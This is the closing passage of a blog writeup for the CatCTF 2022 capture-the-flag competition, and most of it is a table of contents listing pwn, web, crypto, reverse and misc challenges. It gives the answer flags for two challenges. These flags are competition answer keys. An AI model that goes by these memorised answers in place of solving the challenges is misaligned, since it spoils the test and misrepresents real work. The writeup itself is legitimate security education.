
<img src="/2023/01/01/Nepnep-CatCTF2022/image_MpKNvK4Z-P.png" class="">

<p>CatCTF{GPS_M1ao}</p>
<h3 id="Nepnep-ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼-xD"><a href="#Nepnep-ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼-xD" class="headerlink" title="Nepnep ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼&#xD;"></a>Nepnep ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼&#xD;</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0&vd_source=fa625999cb95a3474b87f02e1e0f148f" title="æ–°å¹´å¿«ä¹ï¼_å“”å“©å“”å“©_bilibili">æ–°å¹´å¿«ä¹ï¼_å“”å“©å“”å“©_bilibili</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0&vd_source=fa625999cb95a3474b87f02e1e0f148f" title="https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0&amp;vd_source=fa625999cb95a3474b87f02e1e0f148f">https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from&#x3D;333.999.0.0&amp;vd_source&#x3D;fa625999cb95a3474b87f02e1e0f148f</a></p>
<p>è§†é¢‘è¯„è®ºåŒºç½®é¡¶ï¼Œè§†é¢‘æœ€åä¸€å¸§ä¹Ÿæœ‰</p>
<p>H4ppy_n3w_y34r</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io">xia0ji233</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/">https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://xia0ji233.github.io" target="_blank">xia0ji233's blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/04/Go13/" title="Golangå…¥é—¨å­¦ä¹ ï¼ˆ13ï¼‰"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">Golangå…¥é—¨å­¦ä¹ ï¼ˆ13ï¼‰</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/target/" title="å­¦ä¹ ç›®æ ‡"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">å­¦ä¹ ç›®æ ‡</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><a href="/"> <div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div></a><div class="author-info__name">xia0ji233</div><div class="author-info__description">Nepnep team</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">283</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">107</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xia0ji233"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xia0ji233" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xia0ji233@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">è€å½“ç›Šå£®ï¼Œå®ç§»ç™½é¦–ä¹‹å¿ƒï¼Ÿç©·ä¸”ç›Šåšï¼Œä¸å é’äº‘ä¹‹å¿—ã€‚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">ç›®å½•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E8%B0%A2"><span class="toc-number">1.1.</span> <span class="toc-text">æ„Ÿè°¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%9B%E6%96%B0"><span class="toc-number">1.2.</span> <span class="toc-text">æ‹›æ–°</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bitcoin%F0%9F%AA%99"><span class="toc-number">2.1.</span> <span class="toc-text">bitcoinğŸª™</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">2.1.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.2.</span> <span class="toc-text">éé¢„æœŸ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">æºç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HRPVM%F0%9F%96%A5%EF%B8%8F"><span class="toc-number">2.2.</span> <span class="toc-text">HRPVMğŸ–¥ï¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text">æ¼æ´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">æºç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#injection2-0%F0%9F%92%89"><span class="toc-number">2.3.</span> <span class="toc-text">injection2.0ğŸ’‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.3.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.2.</span> <span class="toc-text">ä¸Šä¼ è„šæœ¬</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kernel-test-%E6%9C%AC%E6%AC%A1%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86%EF%BC%8C%E5%8C%85%E6%8B%AC%E6%BA%90%E7%A0%81%EF%BC%8CEXP%EF%BC%8Cdocker%F0%9F%A7%AC"><span class="toc-number">2.4.</span> <span class="toc-text">kernel-test æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ret2usr"><span class="toc-number">2.4.1.</span> <span class="toc-text">Ret2usr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E8%AE%B2%E8%A7%A3"><span class="toc-number">2.4.2.</span> <span class="toc-text">ç®€æ˜“è®²è§£</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toc-number">2.4.3.</span> <span class="toc-text">æºç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%82%B9"><span class="toc-number">2.4.4.</span> <span class="toc-text">é‡ç‚¹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">2.4.5.</span> <span class="toc-text">æ”»å‡»æ€è·¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">2.4.6.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC-1"><span class="toc-number">2.4.7.</span> <span class="toc-text">ä¸Šä¼ è„šæœ¬</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tips"><span class="toc-number">2.4.8.</span> <span class="toc-text">tips</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%F0%9F%92%BC"><span class="toc-number">2.5.</span> <span class="toc-text">zipğŸ’¼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-1"><span class="toc-number">2.5.1.</span> <span class="toc-text">éé¢„æœŸ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-3"><span class="toc-number">2.5.2.</span> <span class="toc-text">æºç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome-cat-ctf%F0%9F%8E%89"><span class="toc-number">2.6.</span> <span class="toc-text">welcome_cat_ctfğŸ‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chao-%F0%9F%8C%BF"><span class="toc-number">2.7.</span> <span class="toc-text">chao ğŸŒ¿</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.7.1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.7.2.</span> <span class="toc-text">é€†å‘åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.7.3.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.7.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-4"><span class="toc-number">2.7.5.</span> <span class="toc-text">æºç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cat-of-magic%F0%9F%A7%99%E2%80%8D%E2%99%80%EF%B8%8F"><span class="toc-number">2.8.</span> <span class="toc-text">Cat of magicğŸ§™â€â™€ï¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">2.8.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%B0%E5%9B%BE"><span class="toc-number">2.8.2.</span> <span class="toc-text">åœ°å›¾</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-js%F0%9F%90%A6"><span class="toc-number">3.1.</span> <span class="toc-text">ez_jsğŸ¦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cat-cat%F0%9F%98%BC"><span class="toc-number">3.2.</span> <span class="toc-text">Cat catğŸ˜¼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%B0%9D%E8%AF%95"><span class="toc-number">3.2.1.</span> <span class="toc-text">ä¿¡æ¯æ”¶é›†ä¸å°è¯•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%A6%96%E9%A1%B5"><span class="toc-number">3.2.2.</span> <span class="toc-text">é¢˜ç›®é¦–é¡µ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.3.</span> <span class="toc-text">å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81"><span class="toc-number">3.2.4.</span> <span class="toc-text">è¯»å–æºç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#app-py"><span class="toc-number">3.2.5.</span> <span class="toc-text">app.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.6.</span> <span class="toc-text">ä»£ç å®¡è®¡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1app-py"><span class="toc-number">3.2.7.</span> <span class="toc-text">å®¡è®¡app.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E9%83%A8%E5%88%86"><span class="toc-number">3.2.8.</span> <span class="toc-text">flagéƒ¨åˆ†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%83%A8%E5%88%86"><span class="toc-number">3.2.9.</span> <span class="toc-text">æ–‡ä»¶è¯»å–éƒ¨åˆ†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1cat-py"><span class="toc-number">3.2.10.</span> <span class="toc-text">å®¡è®¡cat.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8A%9F%E8%83%BD"><span class="toc-number">3.2.11.</span> <span class="toc-text">æ–‡ä»¶è¯»å–åŠŸèƒ½</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.12.</span> <span class="toc-text">ä½¿ç”¨æ–¹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.2.13.</span> <span class="toc-text">è§£é¢˜</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96secret-key"><span class="toc-number">3.2.14.</span> <span class="toc-text">è·å–secret key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%A0%86%E6%A0%88%E5%88%86%E5%B8%83"><span class="toc-number">3.2.15.</span> <span class="toc-text">è¯»å–å †æ ˆåˆ†å¸ƒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%AF%B9%E5%BA%94%E4%BD%8D%E7%BD%AE%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE"><span class="toc-number">3.2.16.</span> <span class="toc-text">è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0session"><span class="toc-number">3.2.17.</span> <span class="toc-text">ä¼ªé€ session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag"><span class="toc-number">3.2.18.</span> <span class="toc-text">ä¸€é”®è·å–flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">3.2.19.</span> <span class="toc-text">å†™åœ¨æœ€å</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bypass%F0%9F%8D%A5"><span class="toc-number">3.3.</span> <span class="toc-text">ez_bypassğŸ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-curl%F0%9F%94%97"><span class="toc-number">3.4.</span> <span class="toc-text">ez_curlğŸ”—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wife%F0%9F%92%83"><span class="toc-number">3.5.</span> <span class="toc-text">wifeğŸ’ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-challenge%F0%9F%92%AA"><span class="toc-number">3.6.</span> <span class="toc-text">web_challengeğŸ’ª</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DDH-Game"><span class="toc-number">4.1.</span> <span class="toc-text">DDH_Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">4.1.1.</span> <span class="toc-text">è§£æ³•ä¸€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">4.1.2.</span> <span class="toc-text">è§£æ³•äºŒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%9C%BA"><span class="toc-number">4.1.3.</span> <span class="toc-text">åŠ¨æœº</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-theory"><span class="toc-number">4.2.</span> <span class="toc-text">cat_theory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">4.2.1.</span> <span class="toc-text">é¢˜è§£</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%9C%BA-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">åŠ¨æœº</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat%E2%80%99s-gift%F0%9F%8E%81"><span class="toc-number">4.3.</span> <span class="toc-text">catâ€™s giftğŸ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">é¢˜è§£</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.3.2.</span> <span class="toc-text">åè®°</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%96%E8%8C%A8%E6%AF%94-can-you-tell-AES-from-blackbox%EF%BC%9F-sampl%E5%87%BA%E9%A2%98%E4%BA%BA%E5%89%8D%E8%A8%80"><span class="toc-number">4.4.</span> <span class="toc-text">ç›–èŒ¨æ¯”&amp;can you tell AES from blackboxï¼Ÿ&amp;samplå‡ºé¢˜äººå‰è¨€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%96%E8%8C%A8%E6%AF%94"><span class="toc-number">4.5.</span> <span class="toc-text">ç›–èŒ¨æ¯”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mtp"><span class="toc-number">4.5.1.</span> <span class="toc-text">mtp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">4.5.2.</span> <span class="toc-text">çˆ†ç ´</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-you-tell-AES-from-blackbox%EF%BC%9F"><span class="toc-number">4.6.</span> <span class="toc-text">can you tell AES from blackboxï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sample"><span class="toc-number">4.7.</span> <span class="toc-text">sample</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CatFly%F0%9F%9B%AB%F0%9F%90%B1"><span class="toc-number">5.1.</span> <span class="toc-text">CatFlyğŸ›«ğŸ±</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReadingSection"><span class="toc-number">5.2.</span> <span class="toc-text">ReadingSection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StupidOrangeCat2-xD"><span class="toc-number">5.3.</span> <span class="toc-text">StupidOrangeCat2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-cat-did-it"><span class="toc-number">5.4.</span> <span class="toc-text">The cat did it</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%92%8C%E8%A7%A3%E6%B3%95"><span class="toc-number">5.4.1.</span> <span class="toc-text">è®¾è®¡æ€è·¯å’Œè§£æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%AB%E7%8C%AB%E9%95%87%E6%A5%BC"><span class="toc-number">5.4.2.</span> <span class="toc-text">çŒ«çŒ«é•‡æ¥¼</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BugCat"><span class="toc-number">5.5.</span> <span class="toc-text">BugCat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">5.5.1.</span> <span class="toc-text">ä¸€ã€å‰è¨€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%96%B9%E6%A1%88"><span class="toc-number">5.5.2.</span> <span class="toc-text">äºŒã€è§£é¢˜æ–¹æ¡ˆ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC"><span class="toc-number">5.5.3.</span> <span class="toc-text">ä¸‰ã€è§£é¢˜è„šæœ¬</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">6.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#catnim"><span class="toc-number">6.1.</span> <span class="toc-text">catnim</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">6.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#miao"><span class="toc-number">6.2.</span> <span class="toc-text">miao~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Peekaboo"><span class="toc-number">6.3.</span> <span class="toc-text">Peekaboo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MeowMeow"><span class="toc-number">6.4.</span> <span class="toc-text">MeowMeow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatFlag"><span class="toc-number">6.5.</span> <span class="toc-text">CatFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatPaw"><span class="toc-number">6.6.</span> <span class="toc-text">CatPaw</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8B%A5%E6%9C%89%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%AF%B9%E5%BA%94%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80"><span class="toc-number">6.6.1.</span> <span class="toc-text">1. æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AF%BB%E6%89%BE%E5%B0%8F%E7%B1%B3%E5%AE%89%E5%85%A8%E9%94%AE%E7%9B%98%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80"><span class="toc-number">6.6.2.</span> <span class="toc-text">2.å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%90%88%E7%90%86%E7%8C%9C%E6%B5%8B"><span class="toc-number">6.6.3.</span> <span class="toc-text">3.åˆç†çŒœæµ‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%87%8D%E6%94%BE"><span class="toc-number">6.6.4.</span> <span class="toc-text">4.é‡æ”¾?</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatJump"><span class="toc-number">6.7.</span> <span class="toc-text">CatJump</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">6.7.1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E7%81%B5%E6%84%9F%E6%9D%A5%E6%BA%90"><span class="toc-number">6.7.2.</span> <span class="toc-text">å‡ºé¢˜çµæ„Ÿæ¥æº</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">6.7.3.</span> <span class="toc-text">æ­£æ–‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF1"><span class="toc-number">6.7.4.</span> <span class="toc-text">è§£é¢˜æ€è·¯1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF2"><span class="toc-number">6.7.5.</span> <span class="toc-text">è§£é¢˜æ€è·¯2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF3%EF%BC%88%E9%9D%9E%E9%A2%84%E6%9C%9F%EF%BC%89"><span class="toc-number">6.7.6.</span> <span class="toc-text">è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatCat"><span class="toc-number">6.8.</span> <span class="toc-text">CatCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatchCat"><span class="toc-number">6.9.</span> <span class="toc-text">CatchCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nepnep-%E7%A5%9D%E4%BD%A0%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%E5%95%A6%EF%BC%81-xD"><span class="toc-number">6.10.</span> <span class="toc-text">Nepnep ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/31/Summary2024/" title="2024å¹´ç»ˆæ€»ç»“">2024å¹´ç»ˆæ€»ç»“</a><time datetime="2024-12-31T11:00:00.000Z" title="å‘è¡¨äº 2024-12-31 19:00:00">2024-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/11/qwb2024_final_reverse/" title="å¼ºç½‘æ¯S8å†³èµ›Reverse writeup">å¼ºç½‘æ¯S8å†³èµ›Reverse writeup</a><time datetime="2024-12-11T05:00:00.000Z" title="å‘è¡¨äº 2024-12-11 13:00:00">2024-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/qwb2024_final/" title="å¼ºç½‘æ¯S8å†³èµ›pwn writeup">å¼ºç½‘æ¯S8å†³èµ›pwn writeup</a><time datetime="2024-12-07T17:00:00.000Z" title="å‘è¡¨äº 2024-12-08 01:00:00">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/24/WindowsDriver1/" title="windowsé©±åŠ¨å¼€å‘ï¼ˆ1ï¼‰â€”â€”Windowsé©±åŠ¨å­—ç¬¦ä¸²">windowsé©±åŠ¨å¼€å‘ï¼ˆ1ï¼‰â€”â€”Windowsé©±åŠ¨å­—ç¬¦ä¸²</a><time datetime="2024-11-24T15:00:00.000Z" title="å‘è¡¨äº 2024-11-24 23:00:00">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/23/WindowsDriver0/" 